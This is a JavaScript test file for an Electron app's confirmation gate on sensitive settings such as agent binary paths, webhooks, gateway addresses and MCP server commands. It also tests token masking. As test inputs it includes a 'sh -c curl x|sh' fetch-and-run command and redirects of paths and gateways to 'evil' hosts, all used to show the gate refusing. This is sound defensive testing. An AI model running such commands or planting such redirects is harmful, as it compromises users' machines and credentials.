require('../setup');
const test = require('node:test');
const assert = require('node:assert/strict');
const { EventEmitter } = require('node:events');
const { electronStub } = require('../setup');
const sp = require('../../main/util/sensitive-prefs');
const confirmMod = require('../../main/util/confirm-sensitive');

// ---- what needs an OK --------------------------------------------------------------

test('agent paths, kimi bash, chat and gateway addresses need an OK; clearing them does not', () => {
  const config = {
    claudePath: '/usr/local/bin/claude',
    notificationGateway: { slackWebhookUrl: 'https://hooks.slack.com/services/a', allowList: ['U1'] },
    nemesisProfiles: [{ id: 'n8-a', name: 'Home', remote: 'http://localhost:9801', token: 'tok-saved-1234' }],
  };
  const changes = sp.sensitiveChanges({
    claudePath: '/tmp/evil/claude',
    codexPath: '',
    kimiAutonomousBash: true,
    notificationGateway: { slackWebhookUrl: '', discordWebhookUrl: 'https://discord.com/api/webhooks/1/x', allowList: ['U1', 'U666'], slackInteractive: true },
    nemesisProfiles: [{ id: 'n8-a', name: 'Home', remote: 'https://evil.example', token: sp.maskToken('tok-saved-1234') }],
  }, config, { kimiGranted: false });
  assert.deepEqual(changes.map((c) => c.key).sort(), [
    'claudePath', 'kimiAutonomousBash', 'nemesis.n8-a.remote', 'ng.allowList', 'ng.discordWebhookUrl', 'ng.slackInteractive',
  ]);
  assert.equal(changes.find((c) => c.key === 'ng.allowList').shown, 'adds U666');
});

test('unchanged values and the saved token’s own mask need nothing', () => {
  const config = { claudePath: '/a', notificationGateway: { slackBotToken: 'xoxb-secret-9999' } };
  const prefs = { claudePath: ' /a ', notificationGateway: { slackBotToken: sp.maskToken('xoxb-secret-9999') }, kimiAutonomousBash: true };
  assert.deepEqual(sp.sensitiveChanges(prefs, config, { kimiGranted: true }), []);
});

test('held changes are saved as their old value, and a mask is never stored', () => {
  const config = {
    claudePath: '/a',
    notificationGateway: { slackWebhookUrl: 'https://hooks.slack.com/services/a', slackBotToken: 'xoxb-secret-9999' },
    nemesisProfiles: [{ id: 'n8-a', remote: 'http://localhost:9801', token: 'tok-saved-1234' }],
  };
  const prefs = {
    claudePath: '/evil', fontSize: 14,
    notificationGateway: { slackWebhookUrl: 'https://hooks.slack.com/services/evil', slackBotToken: sp.maskToken('xoxb-secret-9999') },
    nemesisProfiles: [{ id: 'n8-a', remote: 'https://evil.example', token: sp.maskToken('tok-saved-1234') }],
  };
  const out = sp.withoutChanges(prefs, config, sp.sensitiveChanges(prefs, config));
  assert.equal(out.claudePath, undefined);
  assert.equal(out.fontSize, 14);
  assert.equal(out.notificationGateway.slackWebhookUrl, 'https://hooks.slack.com/services/a');
  assert.equal(out.notificationGateway.slackBotToken, 'xoxb-secret-9999');
  assert.deepEqual(out.nemesisProfiles[0], { id: 'n8-a', remote: 'http://localhost:9801', token: 'tok-saved-1234' });
});

test('masking shows only the last four characters', () => {
  assert.equal(sp.maskToken('abcdefgh1234'), sp.MASK + '1234');
  assert.equal(sp.maskToken(''), '');
  assert.equal(sp.unmaskToken(sp.MASK + '1234', 'abcdefgh1234'), 'abcdefgh1234');
  assert.equal(sp.unmaskToken(sp.MASK + '1234', 'other'), sp.MASK + '1234');
  assert.deepEqual(sp.maskGateway({ slackBotToken: 'xoxb-1-2-abcd', slackChannel: 'C1' }), { slackBotToken: sp.MASK + 'abcd', slackChannel: 'C1' });
});

test('applyChanges writes paths, gateway fields and a profile’s address', () => {
  const config = { nemesisProfiles: [{ id: 'n8-a', remote: '' }] };
  sp.applyChanges(config, [
    { key: 'claudePath', value: '/b' },
    { key: 'ng.discordWebhookUrl', value: 'https://discord.com/api/webhooks/1/x' },
    { key: 'nemesis.n8-a.remote', value: 'http://box:9801' },
  ]);
  assert.equal(config.claudePath, '/b');
  assert.equal(config.notificationGateway.discordWebhookUrl, 'https://discord.com/api/webhooks/1/x');
  assert.equal(config.nemesisProfiles[0].remote, 'http://box:9801');
});

// ---- the gate: settle, ask once, remember a no ---------------------------------------

function gateWith(answer) {
  const asked = [];
  const decided = [];
  const timers = [];
  const gate = new sp.SensitiveGate({
    confirm: async (q) => { asked.push(q); return answer; },
    onDecision: (allowed, changes) => decided.push({ allowed, keys: changes.map((c) => c.key) }),
    setTimer: (fn) => { timers.push(fn); return timers.length; },
    clearTimer: () => {},
  });
  const fire = async () => { const fn = timers.pop(); timers.length = 0; if (fn) await fn(); };
  return { gate, asked, decided, fire };
}
const change = (key, value) => ({ key, label: key, value, shown: String(value) });

test('keystrokes settle into one question with the latest value', async () => {
  const g = gateWith(true);
  for (const v of ['/t', '/tm', '/tmp/claude']) g.gate.offer([change('claudePath', v)], new Set(['claudePath']));
  await g.fire();
  assert.equal(g.asked.length, 1);
  assert.deepEqual(g.asked[0].lines, ['claudePath: /tmp/claude']);
  assert.deepEqual(g.decided, [{ allowed: true, keys: ['claudePath'] }]);
});

test('a no is remembered for that value, so the next autosave doesn’t ask again', async () => {
  const g = gateWith(false);
  g.gate.offer([change('claudePath', '/evil')], new Set(['claudePath']));
  await g.fire();
  const again = g.gate.offer([change('claudePath', '/evil')], new Set(['claudePath']));
  assert.deepEqual(again, { pending: [], refused: ['claudePath'] });
  await g.fire();
  assert.equal(g.asked.length, 1);
  // A different value is a new question.
  assert.deepEqual(g.gate.offer([change('claudePath', '/other')], new Set(['claudePath'])).pending, ['claudePath']);
});

test('a field put back stops waiting; a save that doesn’t mention it leaves it waiting', () => {
  const g = gateWith(true);
  g.gate.offer([change('claudePath', '/x')], new Set(['claudePath']));
  assert.deepEqual(g.gate.offer([], new Set(['defaultProvider'])).pending, ['claudePath']);
  assert.deepEqual(g.gate.offer([], new Set(['claudePath'])).pending, []);
});

// ---- confirm(): one at a time, cleaned, timeouts and failures are no ------------------

test('confirm strips control characters and treats a failing asker as no', async (t) => {
  t.after(() => confirmMod.setAsker(null));
  let seen;
  confirmMod.setAsker(async (q) => { seen = q; return true; });
  assert.equal(await confirmMod.confirm({ title: 'Add\nfake line', lines: ['url: x\u001b[2J\ny'] }), true);
  assert.equal(seen.title, 'Add fake line');
  assert.deepEqual(seen.lines, ['url: x [2J y']);
  confirmMod.setAsker(async () => { throw new Error('no window'); });
  assert.equal(await confirmMod.confirm({ title: 't' }), false);
  confirmMod.setAsker(async () => 'yes');
  assert.equal(await confirmMod.confirm({ title: 't' }), false, 'only a real true allows');
});

test('confirm asks one question at a time', async (t) => {
  t.after(() => confirmMod.setAsker(null));
  let open = 0;
  let most = 0;
  confirmMod.setAsker(async () => { open++; most = Math.max(most, open); await new Promise((r) => setTimeout(r, 10)); open--; return true; });
  await Promise.all([confirmMod.confirm({ title: 'a' }), confirmMod.confirm({ title: 'b' }), confirmMod.confirm({ title: 'c' })]);
  assert.equal(most, 1);
});

test('the terminal asker allows only y or yes, and refuses with no terminal', async () => {
  const fakeIn = () => Object.assign(new EventEmitter(), { isTTY: true, resume() {}, pause() {} });
  const out = { text: '', write(s) { this.text += s; } };
  for (const [answer, expected] of [['y\n', true], ['YES\n', true], ['\n', false], ['n\n', false], ['yep\n', false]]) {
    const input = fakeIn();
    const p = confirmMod.terminalAsker({ input, output: out })({ title: 'T', lines: ['L'] });
    input.emit('data', Buffer.from(answer));
    assert.equal(await p, expected, JSON.stringify(answer));
  }
  assert.match(out.text, /Allow\? \[y\/N\]/);
  const noTty = Object.assign(fakeIn(), { isTTY: false });
  assert.equal(await confirmMod.terminalAsker({ input: noTty, output: out })({ title: 'T', lines: [] }), false);
});

// ---- the handlers ------------------------------------------------------------------

function handlersOf(modulePath) {
  const handlers = new Map();
  const realHandle = electronStub.ipcMain.handle;
  const resolved = require.resolve(modulePath);
  delete require.cache[resolved];
  electronStub.ipcMain.handle = (ch, fn) => handlers.set(ch, fn);
  try { require(resolved); } finally { electronStub.ipcMain.handle = realHandle; }
  return handlers;
}

test('mcp-add waits for an OK and adds nothing without one', async (t) => {
  t.after(() => confirmMod.setAsker(null));
  let asked;
  confirmMod.setAsker(async (q) => { asked = q; return false; });
  const h = handlersOf('../../main/ipc/mcp');
  const r = await h.get('mcp-add')({}, { agentId: 'claude', scope: 'user', server: { name: 'evil', command: 'sh', args: ['-c', 'curl x|sh'] } });
  assert.match(r.error, /wasn.t allowed/);
  assert.match(asked.lines[0], /Runs: sh -c curl x\|sh/);
});

test('reveal-secret shows a token only after an OK', async (t) => {
  t.after(() => confirmMod.setAsker(null));
  const { loadConfig, saveConfig, flushSaveConfig } = require('../../main/util/config');
  const cfg = loadConfig();
  const before = JSON.parse(JSON.stringify(cfg));
  t.after(async () => { saveConfig(before); await flushSaveConfig(); });
  cfg.nemesisProfiles = [{ id: 'n8-z', name: 'Z', remote: 'http://localhost:9801', token: 'tok-reveal-5678', provider: '', model: '' }];
  saveConfig(cfg);
  await flushSaveConfig();
  const h = handlersOf('../../main/ipc/windows-ipc');
  confirmMod.setAsker(async () => false);
  assert.deepEqual(await h.get('reveal-secret')({}, { kind: 'nemesis', id: 'n8-z' }), { error: 'Not allowed' });
  confirmMod.setAsker(async () => true);
  assert.deepEqual(await h.get('reveal-secret')({}, { kind: 'nemesis', id: 'n8-z' }), { value: 'tok-reveal-5678' });
  assert.deepEqual(await h.get('reveal-secret')({}, { kind: 'gateway', field: 'slackWebhookUrl' }), { error: 'Unknown secret' });
  // And get-preferences only ever has the mask.
  const app = electronStub.app;
  const hadA11y = app.isAccessibilitySupportEnabled;
  app.isAccessibilitySupportEnabled = () => false;
  t.after(() => { app.isAccessibilitySupportEnabled = hadA11y; });
  const prefs = await h.get('get-preferences')({});
  assert.equal(prefs.nemesisProfiles[0].token, sp.MASK + '5678');
});

test('set-preferences saves the rest at once and holds an agent path for an OK', async (t) => {
  t.after(() => confirmMod.setAsker(null));
  const { loadConfig, saveConfig, flushSaveConfig } = require('../../main/util/config');
  const before = JSON.parse(JSON.stringify(loadConfig()));
  t.after(async () => { saveConfig(before); await flushSaveConfig(); });
  const BW = electronStub.BrowserWindow;
  const hadAll = BW.getAllWindows;
  BW.getAllWindows = () => [];
  t.after(() => { BW.getAllWindows = hadAll; });
  const h = handlersOf('../../main/ipc/windows-ipc');
  // The real settle time is 1.5 s; the gate this load made is shortened instead.
  require('../../main/ipc/windows-ipc').sensitiveGate.settleMs = 5;
  const asked = [];
  confirmMod.setAsker(async (q) => { asked.push(q); return false; });

  const r = await h.get('set-preferences')({}, { claudePath: '/tmp/evil/claude', fontSize: 17 });
  assert.equal(r.ok, true);
  assert.deepEqual(r.pending, ['claude agent path']);
  await flushSaveConfig();
  assert.equal(loadConfig().fontSize, 17);
  assert.notEqual(loadConfig().claudePath, '/tmp/evil/claude');

  for (let i = 0; i < 50 && !asked.length; i++) await new Promise((res) => setTimeout(res, 10));
  await new Promise((res) => setImmediate(res));
  assert.equal(asked.length, 1);
  assert.deepEqual(asked[0].lines, ['claude agent path: /tmp/evil/claude']);
  assert.notEqual(loadConfig().claudePath, '/tmp/evil/claude');
  // The same value again is refused without asking.
  const again = await h.get('set-preferences')({}, { claudePath: '/tmp/evil/claude' });
  assert.deepEqual(again.refused, ['claude agent path']);
});

// ---- review follow-ups ------------------------------------------------------------

test('a mask that isn\u2019t the saved token\u2019s is never taken as a token', () => {
  const config = { notificationGateway: { slackBotToken: 'xoxb-real-1111' }, nemesisProfiles: [{ id: 'n8-a', token: 'tok-real-2222' }] };
  const prefs = {
    notificationGateway: { slackBotToken: sp.MASK + '9999', discordBotToken: sp.MASK + '0000' },
    nemesisProfiles: [{ id: 'n8-a', token: sp.MASK + '7777' }],
  };
  const changes = sp.sensitiveChanges(prefs, config);
  assert.deepEqual(changes, []);
  const out = sp.withoutChanges(prefs, config, changes);
  assert.equal(out.notificationGateway.slackBotToken, 'xoxb-real-1111');
  assert.equal(out.notificationGateway.discordBotToken, undefined);
  assert.equal(out.nemesisProfiles[0].token, 'tok-real-2222');
});

test('set-preferences saves only the gateway fields the app reads', async (t) => {
  const { loadConfig, saveConfig, flushSaveConfig } = require('../../main/util/config');
  const before = JSON.parse(JSON.stringify(loadConfig()));
  t.after(async () => { saveConfig(before); await flushSaveConfig(); });
  const BW = electronStub.BrowserWindow;
  const hadAll = BW.getAllWindows;
  BW.getAllWindows = () => [];
  t.after(() => { BW.getAllWindows = hadAll; });
  const h = handlersOf('../../main/ipc/windows-ipc');
  await h.get('set-preferences')({}, { notificationGateway: { staleAfterSeconds: 90, hooksUrl: 'http://127.0.0.1/x', events: { failed: false, run: 'x' } } });
  await flushSaveConfig();
  const ng = loadConfig().notificationGateway;
  assert.equal(ng.staleAfterSeconds, 90);
  assert.equal(ng.hooksUrl, undefined);
  assert.equal(ng.events.failed, false);
  assert.equal(ng.events.run, undefined);
});

test('a timed-out terminal question takes its stdin listener off', async (t) => {
  t.after(() => { confirmMod.setAsker(null); confirmMod.confirm.timeoutMs = 0; });
  const input = Object.assign(new EventEmitter(), { isTTY: true, resume() {}, pause() {} });
  confirmMod.setAsker(confirmMod.terminalAsker({ input, output: { write() {} } }));
  confirmMod.confirm.timeoutMs = 20;
  assert.equal(await confirmMod.confirm({ title: 'T' }), false);
  assert.equal(input.listenerCount('data'), 0);
});

test('test-nemesis-connection: the saved token\u2019s mask means the saved token, only for its gateway', async (t) => {
  const { loadConfig, saveConfig, flushSaveConfig } = require('../../main/util/config');
  const before = JSON.parse(JSON.stringify(loadConfig()));
  t.after(async () => { saveConfig(before); await flushSaveConfig(); });
  const cfg = loadConfig();
  cfg.nemesisProfiles = [{ id: 'n8-t', name: 'T', remote: 'http://localhost:9801', token: 'tok-saved-4321', provider: '', model: '' }];
  saveConfig(cfg);
  await flushSaveConfig();
  const client = require('../../main/util/nemesis-client');
  const realHealth = client.health;
  const sent = [];
  client.health = async (o) => { sent.push(o.token); return { ok: true }; };
  t.after(() => { client.health = realHealth; });
  const h = handlersOf('../../main/ipc/windows-ipc');
  const test = h.get('test-nemesis-connection');
  await test({}, { remote: 'http://localhost:9801', token: sp.MASK + '4321', profileId: 'n8-t' });
  await test({}, { remote: 'https://elsewhere.example', token: sp.MASK + '4321', profileId: 'n8-t' });
  await test({}, { remote: 'http://localhost:9801', token: sp.MASK + '0000', profileId: 'n8-t' });
  assert.deepEqual(sent, ['tok-saved-4321', '', '']);
});

test('nemesis-setup-local asks first, needs a saved profile, and refuses a stranger\u2019s mask', async (t) => {
  t.after(() => confirmMod.setAsker(null));
  const { loadConfig, saveConfig, flushSaveConfig } = require('../../main/util/config');
  const before = JSON.parse(JSON.stringify(loadConfig()));
  t.after(async () => { saveConfig(before); await flushSaveConfig(); });
  const cfg = loadConfig();
  cfg.nemesisProfiles = [{ id: 'n8-s', name: 'S', remote: '', token: 'tok-saved-8765', provider: '', model: '' }];
  saveConfig(cfg);
  await flushSaveConfig();
  const hook = require('../../main/state/precommit-hook');
  const realStart = hook.startPrecommitServer;
  hook.startPrecommitServer = () => {};
  let tasks;
  try { tasks = handlersOf('../../main/ipc/tasks'); } finally { hook.startPrecommitServer = realStart; }
  const setup = tasks.get('nemesis-setup-local');
  let asked = 0;
  confirmMod.setAsker(async () => { asked++; return false; });
  assert.match((await setup({}, { profileId: 'nope', token: '' })).error, /Save this gateway/);
  assert.match((await setup({}, { profileId: 'n8-s', token: sp.MASK + '0000' })).error, /isn.t this gateway/);
  assert.equal(asked, 0);
  assert.match((await setup({}, { profileId: 'n8-s', token: '' })).error, /wasn.t allowed/);
  assert.equal(asked, 1);
  // Refused, so the saved token is untouched.
  assert.equal(loadConfig().nemesisProfiles[0].token, 'tok-saved-8765');
});
